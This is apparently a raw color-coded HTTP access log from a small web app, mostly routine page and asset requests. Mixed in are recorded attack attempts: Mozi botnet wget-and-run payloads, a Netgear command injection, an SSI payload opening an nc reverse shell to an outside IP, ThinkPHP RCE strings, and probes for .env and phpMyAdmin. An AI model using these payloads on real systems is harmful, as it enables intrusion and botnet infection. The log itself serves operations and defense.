[0mGET / [36m304 [0m10.346 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.191 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.736 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.710 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.810 ms - -[0m
[0mGET / [36m304 [0m1.182 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.386 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.547 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.654 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.490 ms - -[0m
[0mGET / [36m304 [0m0.936 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.415 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.007 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.147 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.509 ms - -[0m
[0mGET / [36m304 [0m0.967 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.491 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.572 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.612 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.516 ms - -[0m
[0mGET / [36m304 [0m1.018 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.422 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.055 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.165 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.429 ms - -[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m17.415 ms - 913[0m
[0mGET / [32m200 [0m0.931 ms - 867[0m
[0mGET / [32m200 [0m0.867 ms - 867[0m
[0mGET / [32m200 [0m0.926 ms - 867[0m
[0mGET / [32m200 [0m0.894 ms - 867[0m
[0mGET / [32m200 [0m0.877 ms - 867[0m
[0mGET / [32m200 [0m0.852 ms - 867[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.185 ms - 160302[0m
[0mGET /stylesheets/style.css [32m200 [0m0.668 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m2.188 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m4.193 ms - 97163[0m
[0mGET /favicon.ico [33m404 [0m1.228 ms - 913[0m
[0mGET /add [32m200 [0m1.209 ms - 856[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.586 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.353 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.510 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.596 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.014 ms - 913[0m
[0mGET /list [32m200 [0m1.096 ms - 857[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.565 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.446 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.477 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.901 ms - 913[0m
[0mGET /list [32m200 [0m1.004 ms - 857[0m
[0mGET /stylesheets/style.css [36m304 [0m0.451 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.590 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.974 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.100 ms - -[0m
[0mGET /list [36m304 [0m0.863 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.664 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.496 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.352 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.494 ms - -[0m
[0mGET /add [36m304 [0m1.169 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.475 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.553 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.459 ms - -[0m
[0mGET /list [36m304 [0m0.871 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.455 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.593 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.587 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.409 ms - -[0m
[0mGET /list [32m200 [0m0.903 ms - 857[0m
[0mGET /stylesheets/style.css [36m304 [0m0.374 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.528 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.475 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.564 ms - -[0m
[0mGET /list [36m304 [0m0.826 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.848 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.093 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.443 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.462 ms - -[0m
[0mGET / [36m304 [0m0.833 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.338 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.558 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.493 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.582 ms - -[0m
[0mGET / [32m200 [0m0.828 ms - 867[0m
[0mGET / [32m200 [0m0.802 ms - 867[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://59.180.162.41:36106/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.984 ms - 913[0m
[0mGET /stylesheets/style.css [36m304 [0m0.485 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.368 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.555 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.493 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.989 ms - 913[0m
[0mGET / [36m304 [0m0.799 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.452 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.379 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.146 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.905 ms - -[0m
[0mGET /list [32m200 [0m0.931 ms - 857[0m
[0mGET /stylesheets/style.css [36m304 [0m0.472 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.115 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.170 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.342 ms - -[0m
[0mGET /add [32m200 [0m0.791 ms - 856[0m
[0mGET /stylesheets/style.css [36m304 [0m1.568 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.203 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.805 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m4.579 ms - -[0m
[0mGET /add [36m304 [0m0.932 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.421 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.298 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.083 ms - -[0m
[0mGET /add [36m304 [0m0.869 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.699 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.710 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.604 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.472 ms - -[0m
[0mGET /add [36m304 [0m0.791 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.954 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.400 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.425 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m4.677 ms - -[0m
[0mGET /list [36m304 [0m0.874 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.446 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.277 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.482 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.279 ms - -[0m
[0mGET / [36m304 [0m39.888 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m3.586 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.317 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.024 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.838 ms - -[0m
[0mGET / [32m200 [0m14.669 ms - 890[0m
[0mGET /stylesheets/style.css [36m304 [0m0.925 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.204 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.089 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m6.835 ms - -[0m
[0mGET / [36m304 [0m1.001 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.484 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.059 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m4.773 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m6.805 ms - -[0m
[0mGET / [36m304 [0m0.814 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.395 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.513 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.196 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m4.870 ms - -[0m
[0mGET / [36m304 [0m0.828 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.905 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m20.627 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m21.611 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m24.137 ms - -[0m
[0mGET / [32m200 [0m10.448 ms - 867[0m
[0mGET /stylesheets/style.css [36m304 [0m1.406 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.393 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.416 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m4.714 ms - -[0m
[0mGET / [36m304 [0m1.062 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.453 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.247 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.380 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.799 ms - -[0m
[0mGET /.env [33m404 [0m2.396 ms - 913[0m
[0mGET /stylesheets/style.css [36m304 [0m0.497 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.536 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.595 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.545 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.504 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.343 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.390 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m5.087 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.488 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.674 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.251 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m5.569 ms - -[0m
[0mGET / [32m200 [0m0.883 ms - 867[0m
[0mGET / [32m200 [0m1.008 ms - 867[0m
[0mGET / [32m200 [0m0.910 ms - 867[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m1.171 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.092 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m1.142 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m0.956 ms - 913[0m
[0mGET / [32m200 [0m1.947 ms - 867[0m
[0mGET / [32m200 [0m0.912 ms - 867[0m
[0mGET / [32m200 [0m0.691 ms - 867[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m1.080 ms - 913[0m
[0mGET / [32m200 [0m0.894 ms - 867[0m
[0mHEAD /robots.txt [33m404 [0m0.982 ms - 913[0m
[0mGET / [32m200 [0m0.899 ms - 867[0m
[0mGET / [32m200 [0m0.881 ms - 867[0m
[0mGET / [32m200 [0m0.839 ms - 867[0m
[0mGET / [32m200 [0m1.845 ms - 867[0m
[0mGET / [32m200 [0m0.800 ms - 867[0m
[0mGET /hudson [33m404 [0m1.120 ms - 913[0m
[0mGET / [32m200 [0m0.886 ms - 867[0m
[0mGET / [32m200 [0m0.814 ms - 867[0m
[0mGET / [32m200 [0m0.893 ms - 867[0m
[0mGET / [32m200 [0m0.814 ms - 867[0m
[0mGET / [32m200 [0m0.839 ms - 867[0m
[0mGET / [32m200 [0m0.882 ms - 867[0m
[0mGET / [32m200 [0m0.908 ms - 867[0m
[0mGET /.env [33m404 [0m0.851 ms - 913[0m
[0mPOST / [33m404 [0m17.197 ms - 913[0m
[0mGET / [32m200 [0m0.855 ms - 867[0m
[0mGET / [32m200 [0m0.868 ms - 867[0m
[0mGET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2083.97.20.130%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e [33m404 [0m2.079 ms - 913[0m
[0mGET / [32m200 [0m0.819 ms - 867[0m
[0mGET / [32m200 [0m0.660 ms - 867[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.978 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.768 ms - 867[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.801 ms - 867[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.936 ms - 913[0m
[0mGET / [32m200 [0m0.811 ms - 867[0m
[0mGET http://example.com/ [32m200 [0m1.847 ms - 867[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.143 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.771 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m0.997 ms - 913[0m
[0mGET / [32m200 [0m0.756 ms - 867[0m
[0mGET / [32m200 [0m0.896 ms - 867[0m
[0mGET / [32m200 [0m0.792 ms - 867[0m
[0mGET / [32m200 [0m0.747 ms - 867[0m
[0mHEAD /robots.txt [33m404 [0m0.959 ms - 913[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m1.834 ms - 913[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.904 ms - 913[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.953 ms - 913[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.918 ms - 913[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.945 ms - 913[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.933 ms - 913[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.7.158.220:51208/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.019 ms - 913[0m
[0mGET / [32m200 [0m0.762 ms - 867[0m
[0mGET /robots.txt [33m404 [0m0.910 ms - 913[0m
[0mGET /sitemap.xml [33m404 [0m1.673 ms - 913[0m
[0mGET /.well-known/security.txt [33m404 [0m0.946 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.985 ms - 913[0m
[0mGET / [32m200 [0m0.838 ms - 867[0m
[0mGET /muieblackcat [33m404 [0m0.972 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.890 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.901 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.888 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.917 ms - 913[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m1.713 ms - 913[0m
[0mGET //Admin/scripts/setup.php [33m404 [0m0.969 ms - 913[0m
[0mGET //mysql/scripts/setup.php/db/scripts/setup.php/typo3/phpmyadmin/scripts/setup.php/web/phpMyAdmin/scripts/setup.php/web/scripts/setup.php/phpmyadmin2/scripts/setup.php/admin/scripts/setup.php/admin/phpmyadmin/scripts/setup.php/phpmyadmin1/scripts/setup.php/xampp/phpmyadmin/scripts/setup.php/php-my-admin/scripts/setup.php [33m404 [0m1.047 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.895 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.081 ms - 913[0m
[0mGET / [32m200 [0m0.776 ms - 867[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.875 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.093 ms - 913[0m
[0mGET / [32m200 [0m0.888 ms - 867[0m
[0mGET / [32m200 [0m1.670 ms - 867[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.021 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.835 ms - 913[0m
